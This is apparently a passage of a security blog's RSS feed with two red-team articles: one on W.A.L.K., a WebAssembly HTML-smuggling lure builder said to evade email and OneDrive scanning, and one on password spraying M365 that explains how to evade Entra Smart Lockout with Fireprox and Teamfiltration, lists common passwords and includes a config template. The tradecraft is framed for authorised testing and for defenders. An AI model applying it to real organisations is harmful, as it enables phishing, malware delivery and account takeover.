    &lt;img src=&#34;images/WelcomeToOneDrive.png&#34; title=&#34;WelcomeToOneDrive&#34; alt=&#34;WelcomeToOneDrive&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WelcomeToOneDrive&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the lure is selected, the program will guide through all the other options and values needed to build the HTML smuggling payload in Web Assembly. For example, the program will ask for the file extension to utilise for the downloaded payload, its location on the file system for the payload to be embedded as well as the file name shown for the file when downloading the payload.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WALK_output.png&#34; title=&#34;WALK output&#34; alt=&#34;WALK output&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WALK output&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once the lure is compiled, W.A.L.K. will show the relative file path of the generated lure. The file to smuggle consists of a standalone “index.html” file contained in the results folder of the project. Such index.html files can then be uploaded and sent via email or chat, effectively allowing your payload to be transported and smuggled through.&lt;/p&gt;
&lt;p&gt;The above-mentioned lures, wrapped in a single HTML file, have been observed successfully landing in hardened corporate email inboxes, surprisingly circumventing any active controls that we are used to experiencing when dealing with email and instant messaging chats (e.g. spam filtering/classification, file AV scans), even when the message comes from standard non-corporate inboxes that present TLDs such as gmail.com, outlook.com, live.com, etc..&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/RevieMyFiles.png&#34; title=&#34;RevieMyFiles&#34; alt=&#34;RevieMyFiles&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;RevieMyFiles&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The figure shows how the index.html file can be embedded into the email body to look more legitimate.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/OneDriveIsAGo.png&#34; title=&#34;OneDriveIsAGo&#34; alt=&#34;OneDriveIsAGo&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;OneDriveIsAGo&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;For example, in this case both the email provider and OneDrive malware scans did not pick up the malicious contents of the file (called myFiles.html) and allowed the Download to happen from their platform.&lt;/p&gt;
&lt;p&gt;The index.html file can then be sent in various ways and linked to your messages using a number of methods that may allow more or less number of clicks before the victim executes the contents of the smuggled payload. The reader is left with the arduous task of determining the best way to convey their smuggling lure to their victims and how many clicks their targets will need to go through before execution.&lt;/p&gt;
&lt;p&gt;Although not properly documented as of now, W.A.L.K. was designed for modularity. This means that it is possible to create more lure templates to expand the menu selection and allow new templates to be utilised with the tool. Despite not being documented yet, these capabilities are there and anyone interested can dive into the code in the repository to leverage this feature. There will eventually be a follow up blog post explaining how to create new Web Assembly lures in Rust and how to make them so that they can be used to expand W.A.L.K.&amp;rsquo;s lurebase.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;&lt;p&gt;Although attacker-centric, this blogpost is intended to be a heads up for detection and response practitioners, but also to any defensive security researchers who feel the urge to dive into the intricacies of such a technique after reading this blog post.&lt;/p&gt;
&lt;p&gt;Current security controls do not yet seem capable of determining the IoCs and the heuristics involved, and so we are in need of additional detection and prevention mechanisms that can reduce the risk of malicious web assembly attacks.&lt;/p&gt;
&lt;p&gt;I really hope you enjoyed this article and will find my tool useful for your future red team engagements or to develop better defences and controls.&lt;/p&gt;
&lt;p&gt;So long, and wish you the best of fun in your hacking journeys!&lt;/p&gt;
&lt;h1&gt;Credit&lt;/h1&gt;&lt;p&gt;Credit where credit is due. This section is dedicated to give a big shout out to NetSPI for the initial research done into weaponising WASM for initial access as described in their article, linked here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The Silk Wasm: Obfuscating HTML Smuggling with Web Assembly&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And another thank you to the researchers at delivr.to who have released an amazing  research on how to build your WASM lure using Rust, which was used as a starting point for W.A.L.K. and really helped me understand this technique. You can find their research here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WebAssembly Smuggling: It WASM’t me&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Resources:&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Link to W.A.L.K. (JUMPSEC Github):
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github - W.A.L.K. Web Assembly Lure Krafter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTML Smuggling
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web Assembly Smuggling Research
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.netspi.com/blog/technical/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Videos
&lt;ul&gt;
&lt;li&gt;Modern Initial Access and Evasion Tactics: &lt;a href=&#34;https://youtu.be/DyyD48iKsKE&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/DyyD48iKsKE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Desperate Infection Chains:&lt;a href=&#34;https://youtu.be/CwNPP_Xfrts&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://youtu.be/CwNPP_Xfrts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CTI
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

      </description>
    </item>
    
    <item>
      <title>Why sneak when you can walk through the front door - A Love letter to Password Spraying against M365 in Red Team Engagements</title>
      <link>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</link>
      <pubDate>Thu, 02 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-02-why-sneak-when-you-can-walk-through-the-front-door/</guid>
      <description>
        
        
        &lt;p&gt;In 2023 through 2024, JUMPSEC&amp;rsquo;s red team gained access to Microsft 365 (M365) environments of sophisticated clients during adversarial engagements with an approach that breathes life into the decades-old technique of password spraying. With threat actors increasingly using similar approaches in the wild, being able to compromise the even likes of &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Microsoft themselves&lt;/a&gt;&lt;/em&gt;, it is my opinion that red teams might benefit from incorporating some of these techniques into their initial access arsenal, or even in external perimeter security testing, to better emulate adversaries and challenge assumptions around intial access.&lt;/p&gt;
&lt;h2&gt;Credit&lt;span class=&#34;absolute -mt-20&#34; id=&#34;credit&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#credit&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Full credit needs to be given to developers of the tools and authors of the following blog posts who kindly shared their ideas. This post is heavily inspired by the work of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/teamfiltration-v3-5-0-improve-all-the-things&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Teamfiltration v 3.5.3, initial v1 released in DEFCON 2022&lt;/a&gt;&lt;/em&gt; - Credits to Flangvik @ TrustedSec&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;//github.com/ustayready/fireprox&#34; &gt;&lt;em&gt;Fireprox, initial release in 2019&lt;/em&gt;&lt;/a&gt; - Credits to ustrayready @ Black Hills InfoSec&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Graphrunner, initial release in Oct 2023&lt;/a&gt;&lt;/em&gt; - Credits to dafthack @ Black Hills InfoSec&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Why M365?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-m365&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-m365&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Historically, Outlook accounts were &lt;em&gt;merely&lt;/em&gt; email inboxes with impactful but limited usability, but this is no longer the case. Barring the capacity to read sensitive businesss communications and impersonate internal users to phish others in an organisation, an attacker&amp;rsquo;s access to M365 accounts often lead to far more impact in hybrid or cloud-native organisations in 2024.&lt;/p&gt;
&lt;p&gt;For example, we have multiple clients where most if not all of their business critical data now resides in SharePoint and access control is tied to M365/Azure groups. An attacker compromising an account with SharePoint access is analogous to getting access to the data of an internal file server in a traditional on-prem context. Let&amp;rsquo;s say said account has read/write access to multiple business-critical SharePoint sites, then they are already analogous to being able to &amp;ldquo;deploy ransomware&amp;rdquo; in a traditional sense, if proper recovery procedures have not been implemented.&lt;/p&gt;
&lt;p&gt;In addition, an active M365 session grants access to GraphAPI and other Microsoft cloud resources, which is a fantastic entrypoint for lateral movement and persistence in the cloud. I do encourage checking out Black Hill&amp;rsquo;s incredible &lt;em&gt;&lt;a href=&#34;https://www.blackhillsinfosec.com/introducing-graphrunner/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;blog post&lt;/a&gt;&lt;/em&gt; on the subject of Azure / GraphAPI lateral movement with GraphRunner if you are interested.&lt;/p&gt;
&lt;h2&gt;The Theory Behind&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-theory-behind&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-theory-behind&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;User&amp;rsquo;s gonna user&lt;span class=&#34;absolute -mt-20&#34; id=&#34;users-gonna-user&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#users-gonna-user&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So, given M365 accounts are juicy targets, how does one gain access? Besides MiTM phishing with tools like Evilginx, consider spraying your way in. The term &amp;ldquo;password spraying&amp;rdquo; refers to trying a small set of passwords (usually less than 20, or even 10 in this context) against a large number (hundreds, or more if possible) of users.&lt;/p&gt;
&lt;p&gt;The core idea is that even in an org with a &amp;ldquo;strong&amp;rdquo; password policy in length and complexity, some users are statistically likely to set easily guessable ones like &lt;code&gt;Welcome@2024&lt;/code&gt;. If an attacker can gather a large number of valid user emails (out of scope of this blog post, but there are many resources for this), they only need to target the statistically common passwords to get the highest chance to find a correct combination.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As a side note, Welcome@YYYY, Season@YYYY, WelcomeYYYY!, Orgname@YYYY appear to be some of the highest hit rate passwords we observed in engagements.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While this is all well and good, there are 2 minor inconveniences in most modern OAuth providers in the forms of:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;intruder identification &amp;amp; blocking, and;&lt;/li&gt;
&lt;li&gt;user lockout.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Since we are targeting M365, we&amp;rsquo;ll discuss Microsoft&amp;rsquo;s implementation, &lt;strong&gt;Entra Smart Lockout&lt;/strong&gt;, which might surprise you.&lt;/p&gt;
&lt;h3&gt;Entra Smart Lockout&lt;span class=&#34;absolute -mt-20&#34; id=&#34;entra-smart-lockout&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#entra-smart-lockout&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;According to this &lt;em&gt;&lt;a href=&#34;https://techcommunity.microsoft.com/t5/microsoft-entra-blog/azure-ad-password-protection-and-smart-lockout-are-now-in-public/ba-p/245423&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MS announcement&lt;/a&gt;&lt;/em&gt;, Smart Lockout is included in all versions of Azure AD (now called Entra ID, probably a different name in 2025?) including implementations in Office365, by default. Customisatiion of Smart Lockout settings &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;requires Microsoft Entra ID P1 license or above&lt;/a&gt;&lt;/em&gt; (Licenses below P1 are stuck with default settings but Smark Lockout is still enabled). Therefore, all M365 corporate clients you encounter should have this feature turned on, and the only variation to expected would be the lockout settings.&lt;/p&gt;
&lt;p&gt;The default settings are as the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(For non-US government tenants): an account is locked after 10 failed attempts.&lt;/li&gt;
&lt;li&gt;The account locks again after each subsequent failed sign-in attempt.&lt;/li&gt;
&lt;li&gt;Lockout period is one minute at first, and longer in subsequent attempts. Microsoft does not disclose the rate at which the lockout period increases after unsuccessful sign-in attempts.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You might be thinking, where&amp;rsquo;s the smart in this, seems to merely be an incremental lockout timer, no? Here&amp;rsquo;s the &lt;em&gt;smart&lt;/em&gt; part:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;When smart lockout locks a user account, we try our best to not lock out the genuine user. To ensure that bad actors can&amp;rsquo;t gain access to a genuine user account. The following considerations apply:&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Familiar vs unfamiliar locations are used to differentiate between a bad actor and the genuine user. They have separate lockout counters.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Once an account is locked out, the lockout state is synchronised across all Microsoft Entra data centers.&lt;/li&gt;
&lt;li&gt;After an account lockout, the user can initiate self-service password reset (SSPR) to sign in again.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And there&amp;rsquo;s the fine print at the end:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In addition to Smart lockout, our default protection analyses and identifies other signals including IP traffic and anomalous behavior. Entra ID blocks these malicious sign-ins by default and returns &lt;em&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;AADSTS50053 - IdsLocked error code&lt;/a&gt;&lt;/em&gt;, regardless of the password validity.&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3&gt;TL;DR as in, sorry I didn&amp;rsquo;t read the Doc&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr-as-in-sorry-i-didnt-read-the-doc&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr-as-in-sorry-i-didnt-read-the-doc&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;From the Microsoft Documentations we can infer a few things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We need to bypass the lockout timer by spacing out attempts. &lt;em&gt;If attempts for the same user are sufficiently spaced out, the lockout timer (meaning, you won&amp;rsquo;t get in even with a correct password) might not hit you, the attacker&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;The attempts should come from different IP addresses, with minimal behavioral patterns that can be identified by Microsoft&amp;rsquo;s algos.&lt;/li&gt;
&lt;li&gt;Unfortunately, unless our attempts come from the same city or region that the user usually logs into, their daily work routine would not reset our &amp;ldquo;unfamiliar&amp;rdquo; lockout counter.&lt;/li&gt;
&lt;li&gt;The AADESTS50053 error can either mean Smart Lockout kicking in, locking the user account, or default protection. Nevertheless, it means we won&amp;rsquo;t get in with the correct password. That being said, &lt;em&gt;MS have an undisclosed internal timer that would reset in the latter case, or the user can unlock themselves via SSPR, so it might not be the end of the world when you see this error.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;As said, if SSPR is on, users can unlock themselves, resulting in less disruption to the client. It is not a &amp;ldquo;get out of jail free&amp;rdquo; card though, as locking a single account may be extremely impactful if it&amp;rsquo;s the wrong one. We cannot overstate the importance of getting a good understanding of offensive toolings that you&amp;rsquo;re using, and having clear and open communcations with your client regarding some of these more &amp;ldquo;risky&amp;rdquo; tradecraft.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Fireprox&lt;span class=&#34;absolute -mt-20&#34; id=&#34;fireprox&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#fireprox&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;While APT Midnight Blizzard was reported &lt;em&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;obtain intial access on Microsoft using distributed residential proxies&lt;/a&gt;&lt;/em&gt; to perform password spraying, red teamers can achieve a similar result by utilising the AWS API gateway service, which can (by design) serve as a proxied gateway to … API services (duh). &lt;em&gt;&lt;a href=&#34;https://github.com/ustayready/fireprox&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Fireprox&lt;/a&gt;&lt;/em&gt; is a tool that creates a wrapper around the usage of this service to create a &amp;ldquo;distributed&amp;rdquo; proxy to send POST requests to login.microsoftonline.com. The next tool introduced in this blog post, Teamfiltration, also incorporates code from Fireprox in its codebase, so if you want to follow along, make sure to sort out the AWS pre-requisites here. You&amp;rsquo;d need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An AWS tenant that you control.&lt;/li&gt;
&lt;li&gt;Create a new IAM user, grant them &lt;code&gt;AmazonAPIGatewayAdministrator&lt;/code&gt; privileges by attaching the policy directly in permissions. Create an access key in &amp;ldquo;Security credentials&amp;rdquo;, choose &amp;ldquo;other&amp;rdquo;, and save the access key ID and secret key somewhere safe.&lt;/li&gt;
&lt;li&gt;(Optionally) Play with Fireprox to figure out what it does.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Basically, how Fireprox works is that you generate a static AWS URL to access an endpoint through AWS&amp;rsquo;s proxy. What makes it interesting is that a different egress IP address is used whenever a new request is made through that generated URL.&lt;/p&gt;
&lt;p&gt;For example, here we created a URL starting with &amp;ldquo;hudi24ri47&amp;rdquo; that is located in the region of us-east-1, and the target is ifconfig.me. By curl-ing repeatedly, we can see the egress IP observed by the target web server is different in every single request.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic2.png&#34; title=&#34;pic2&#34; alt=&#34;pic2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic1.png&#34; title=&#34;pic1&#34; alt=&#34;pic1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you are concerned about costs, API gateway is billed at 100k+ API calls for single digit dollars, so volume generated from engagements, which are usually around 10k requests, never amounted to more than a couple of pennies for us.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Obviously Microsoft would see that the logins come from AWS IP addresses, but that alone has not been enough to trigger lockouts. There are also AWS specific headers that are forwarded or added by the proxy, most importantly the &lt;code&gt;X-Amz-Forwarded-For&lt;/code&gt; header which is removed by Fireprox. You can easily verify this by using your own request catcher and curl with Fireprox and compare the requests received with those sent from vanilla API gateway proxies.&lt;/p&gt;
&lt;h2&gt;Caveats &amp;amp; Disclaimers&lt;span class=&#34;absolute -mt-20&#34; id=&#34;caveats--disclaimers&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#caveats--disclaimers&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Before we discuss the actual tradecraft, do note that you should seek explicit consent from your client before starting any password spraying, and preferrably start from a small user set to minimize disruption. Even if users can self-serve reset their password to unlock their accounts, locking up dozens or even hundreds of accounts, especially without your client&amp;rsquo;s prior knowledge and consent, is professionally unacceptable and the sort of thing that red teamers should avoid at all cost.&lt;/p&gt;
&lt;p&gt;To be absolutely certain about your methodology, spin up your own free (1 month trial) M365 tenant with a number of users to test your methodology before using it on real engagements, as Smart Lockout is enabled by default for all M365 tenants. In fact, when our own red team first dipped our toes into learning this, we started slow and with a lot of anxiety, even with this knowledge and clear communications with our clients. It was over the process of several engagements that we&amp;rsquo;ve learned in depth about how the tooling worked, the thresholds, and so on, that we are finally comfortable recommending it. Bear in mind that locking out accounts on engagements is no laughing matter, and that there is an expectation of professionalism from clients when they purchase a red team.&lt;/p&gt;
&lt;p&gt;Another thing to recommend is to have clear communications with the client regarding what hours the password spraying occur, as some clients do not want out-of-hour password spraying. A spray in our engagements usually takes 2-3 days to complete with Teamfiltration, depending how many passwords/users we can/want to try. Fortunately it can be paused and restarted at any point.&lt;/p&gt;
&lt;p&gt;Needless to say, you are responsible for your own actions.&lt;/p&gt;
&lt;h3&gt;Barging in with Teamfiltration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;barging-in-with-teamfiltration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#barging-in-with-teamfiltration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;With the caveats out of the way, let&amp;rsquo;s dive in. While I write about Teamfiltration here, it is not the only tool for the job, though it is a very fine tool. Think of it as a many-in-one tool kit with user enumeration and data exfiltration, not just password spraying. If you just want password spraying with integration of AWS API gateway proxying (most of the below implemented that through Fireprox), there are a number of alternatives too:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/knavesec/CredMaster&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CredMaster&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/0xZDH/o365spray&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;o365spray&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/optiv/Go365&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Go365&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/Tw1sm/spraycharles&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;spraycharles&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And if you understand the concepts behind Smart Lockout, and maybe have had a read at the source code of Fireprox, it shouldn&amp;rsquo;t be too hard to implement a sprayer from scratch yourself. If you do want to write one, this reference on &lt;em&gt;&lt;a href=&#34;https://trustedsec.com/blog/from-error-to-entry-cracking-the-code-of-password-spraying-tools&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;M365 login error messages&lt;/a&gt;&lt;/em&gt; would be a must-read in my opinion.&lt;/p&gt;
&lt;h2&gt;Setting the tool up&lt;span class=&#34;absolute -mt-20&#34; id=&#34;setting-the-tool-up&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#setting-the-tool-up&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Teamfiltration&amp;rsquo;s author Flangvik&amp;rsquo;s own &lt;em&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=J8ohuanP2gA&amp;amp;list=PLxxLIupMt6nDN5bAJqBZFUpxp8Hcyzbkn&amp;amp;pp=iAQB&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Youtube playlist&lt;/a&gt;&lt;/em&gt; on the its usage is a great reference on how to set up and use the tool. I&amp;rsquo;d still go through the setup briefly here. Teamfiltration is designed around red team engagements and so it stores the information (valid usernames, credentials, password spray log, etc) in a local database, because you wouldn&amp;rsquo;t want to mix the sensitive details of Bank A and Retail Chain B, for example. The tool is designed for a sequential workflow of using &lt;code&gt;--enum&lt;/code&gt; to find valid users, &lt;code&gt;--spray&lt;/code&gt; to find valid username:password pair, and then &lt;code&gt;--exfil&lt;/code&gt; to loot. The reason I go into this is that there is a little quirk of Teamfiltration &amp;ndash; the &lt;code&gt;--spray&lt;/code&gt; module does not seem to have &lt;code&gt;-user&lt;/code&gt; flag (yet?) as it reads the validated users from the local database from prior runs of &lt;code&gt;--enum&lt;/code&gt; which would confuse the heck out of operators who don&amp;rsquo;t know this.&lt;/p&gt;
&lt;p&gt;Beside each of your clients having their own local database, there is also the Teamfiltration profile, which is a json file that you supply to the tool everytime you run it. From an Opsec perspective it does not seem to matter much regarding client segregation, though it offers you a way to further tweak settings inbetween jobs to cater to your needs.&lt;/p&gt;
&lt;p&gt;There are a number of optional inputs in a profile. At a minimum you need to supply:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A set of sacrificial O365 user credentials: The user needs to be in an Azure / M365 tenant. A private MSDN / Outlook / Live account would not work. Reason behind this is that user enum works by searching for a supplied email through Teams, much like how one would message an external org tenant. This functionality doesn&amp;rsquo;t work with accounts &lt;em&gt;not&lt;/em&gt; associated with a tenant. Though it is called &amp;ldquo;sacrificial&amp;rdquo; it is simply used to look people up on Teams.&lt;/li&gt;
&lt;li&gt;AWS access and secret keys to the API gateway IAM account previously described.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Using Teams to enumerate users is approach the author recommended, but there are other available methods, such as the &lt;code&gt;--validate-msol&lt;/code&gt; option which uses the GetCredentialType method and is slower. A nuance we found during our testing was that some accounts (for example, service accounts) indeed do not have a Teams license but would instead only show up on &lt;code&gt;--validate-msol&lt;/code&gt;. On the other hand &lt;code&gt;--validate-login&lt;/code&gt; triggers logins to check, is extremely loud and is not recommended.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For all the other profile options, you can just copy from the Github repo&amp;rsquo;s template. &amp;ldquo;Proxy&amp;rdquo; here refers to a local/remote web proxy for debugging purposes only, for example 127.0.0.1:8080 shown here is the one commonly used by BurpSuite. It is completely optional.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;{
     &amp;#34;pushoverAppKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;pushoverUserKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;dehashedEmail&amp;#34; : &amp;#34;&amp;#34;,
     &amp;#34;dehashedApiKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;sacrificialO365Username&amp;#34;: &amp;#34;tfsacrificialuser1@domain.org&amp;#34;,
      &amp;#34;sacrificialO365Passwords&amp;#34;: &amp;#34;RANDOM123&amp;#34; , 
      &amp;#34;proxyEndpoint&amp;#34;: &amp;#34;http://127.0.0.1:8080&amp;#34;,
      &amp;#34;AWSAccessKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;AWSSecretKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;UserAgent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64)...&amp;#34;,
